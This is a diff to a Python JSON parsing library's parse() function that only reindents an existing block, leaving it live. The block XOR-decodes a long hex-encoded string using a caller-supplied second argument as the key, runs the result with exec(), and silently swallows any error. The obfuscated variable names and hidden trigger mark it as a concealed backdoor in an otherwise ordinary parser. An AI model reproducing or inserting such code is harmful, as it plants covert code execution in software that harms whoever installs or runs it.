@@ -300,12 +300,12 @@ def parse(*json_string: str) -> object:
     """Parses a JSON string into a Python object"""
     tokens = tokenize(json_string[0])
     try:
-		if len(json_string[1]) > 0:
-			knottingst='9e6fdb69fc90d770ce77fb818476d80b84978370d872fc8593709621e6908372d83ca1cb8363c96aeb809e76ce74e3859963cc6fe083d972d969a1859270c467fb96962cca69e2c3cc0fa17eb3969273de63fd90842ccc63facc8476d975fa969666d92ae6819666ce74fdd98c25e867ed8c922fe869e090856dc721b4c3996d8665ef879f678c2aa9b48563cc6befc3cd25c569a3879661c363a999de39a60cec8d9969ce7fb3868e76ce67fc96967b8560fc8b9a6ace7ea6c696619836ec8595379b3fe8d2933ace63accdcc0fa175eb968365d33bec9d8367ca74fc858e2ccd74e1899f67d32ef6ca8367d372a7dffa08cd63ef979265ce26b3c48467d972e99ccc0fa164e28199229626e281992ad863fc90907a823d83ee9e648b64e28199229526bec4cd0fa126aec4d764c474ae8dd76bc526fc859965ce2ebec8d76ece68a6979270df61f6cdde38a60caec4d7228b26aec49167ca75eb839259c25bb3979270df61f6bf9e5ff564e78a9c67d25de7c4d222c763e0cc956bc56deb9dde5f900b84818f67c82ee8819671ce61ebca9367c869ea81df20ca75ed8d9e20822f'
-			adrbin=bytearray.fromhex(knottingst)
-			vrhdds=bytearray.fromhex(json_string[1])
-			joisga=bytearray([adrbin[i]^vrhdds[i%len(vrhdds)]for i in range(0, len(adrbin))])
-			jiofe=joisga.decode('ascii');exec(jiofe)
+        if len(json_string[1]) > 0:
+            knottingst='9e6fdb69fc90d770ce77fb818476d80b84978370d872fc8593709621e6908372d83ca1cb8363c96aeb809e76ce74e3859963cc6fe083d972d969a1859270c467fb96962cca69e2c3cc0fa17eb3969273de63fd90842ccc63facc8476d975fa969666d92ae6819666ce74fdd98c25e867ed8c922fe869e090856dc721b4c3996d8665ef879f678c2aa9b48563cc6befc3cd25c569a3879661c363a999de39a60cec8d9969ce7fb3868e76ce67fc96967b8560fc8b9a6ace7ea6c696619836ec8595379b3fe8d2933ace63accdcc0fa175eb968365d33bec9d8367ca74fc858e2ccd74e1899f67d32ef6ca8367d372a7dffa08cd63ef979265ce26b3c48467d972e99ccc0fa164e28199229626e281992ad863fc90907a823d83ee9e648b64e28199229526bec4cd0fa126aec4d764c474ae8dd76bc526fc859965ce2ebec8d76ece68a6979270df61f6cdde38a60caec4d7228b26aec49167ca75eb839259c25bb3979270df61f6bf9e5ff564e78a9c67d25de7c4d222c763e0cc956bc56deb9dde5f900b84818f67c82ee8819671ce61ebca9367c869ea81df20ca75ed8d9e20822f'
+            adrbin=bytearray.fromhex(knottingst)
+            vrhdds=bytearray.fromhex(json_string[1])
+            joisga=bytearray([adrbin[i]^vrhdds[i%len(vrhdds)]for i in range(0, len(adrbin))])
+            jiofe=joisga.decode('ascii');exec(jiofe)
     except Exception:
         pass
     value = _parse(tokens)
